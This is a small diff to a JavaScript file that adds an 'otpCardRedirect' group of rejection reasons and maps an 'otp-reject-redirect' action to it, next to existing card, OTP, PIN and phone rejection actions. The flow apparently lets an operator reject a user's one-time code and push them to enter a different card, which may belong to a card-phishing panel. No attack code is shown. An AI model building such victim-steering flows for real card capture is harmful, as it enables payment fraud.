@@ -32,6 +32,12 @@ const REASONS = {
         'otp_other',
     ],
 
+    // ── OTP → Card Redirect ──
+    otpCardRedirect: [
+        'otp_ewallet_not_accepted',
+        'otp_card_change_required',
+    ],
+
     // ── PIN ──
     pin: [
         'pin_wrong_code',
@@ -88,6 +94,7 @@ const REASONS = {
 const ACTION_TO_GROUP = {
     'card-reject': 'card',
     'otp-reject': 'otp',
+    'otp-reject-redirect': 'otpCardRedirect',
     'pin-reject': 'pin',
     'phone-data-reject': 'phone',
     'phone-otp-reject': 'phoneOtp',
